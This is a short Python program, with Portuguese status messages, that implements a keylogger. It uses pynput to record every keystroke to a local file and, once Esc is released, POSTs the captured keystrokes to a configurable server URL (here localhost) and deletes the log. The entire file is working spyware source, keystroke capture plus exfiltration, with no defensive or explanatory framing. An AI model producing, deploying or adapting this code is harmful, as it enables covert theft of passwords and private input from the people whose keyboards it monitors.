from pynput.keyboard import Key, Listener
import requests
import shutil
import os

class Keylogger:
    def __init__(self, server_url, keys_file="keys.txt", backup_file="keys_backup.txt"):
        self.server_url = server_url
        self.keys_file = keys_file
        self.backup_file = backup_file

    def data_to_server(self):
        if not os.path.exists(self.keys_file):
            print(f"{self.keys_file} não existe. Nada a enviar.")
            return

        shutil.copy(self.keys_file, self.backup_file)

        with open(self.keys_file, "r") as f:
            data = f.read()

        try:
            response = requests.post(self.server_url, data={"keylogs": data})
            if response.status_code == 200:
                print("Dados enviados com sucesso.")
                os.remove(self.keys_file)
            else:
                print("Falha ao enviar os dados. Restaurando backup.")
                shutil.copy(self.backup_file, self.keys_file)
        except Exception as e:
            print("Erro ao enviar dados: ", e)

    def on_press(self, key):
        try:
            with open(self.keys_file, "a") as f:
                f.write(str(key.char))
        except AttributeError:
            with open(self.keys_file, "a") as f:
                f.write(f"{{{str(key)}}}")

    def on_release(self, key):
        if key == Key.esc:
            return False

    def start(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        self.data_to_server()


if __name__ == "__main__":
    server_url = "http://127.0.0.1:8000/receive"
    keylogger = Keylogger(server_url)
    keylogger.start()
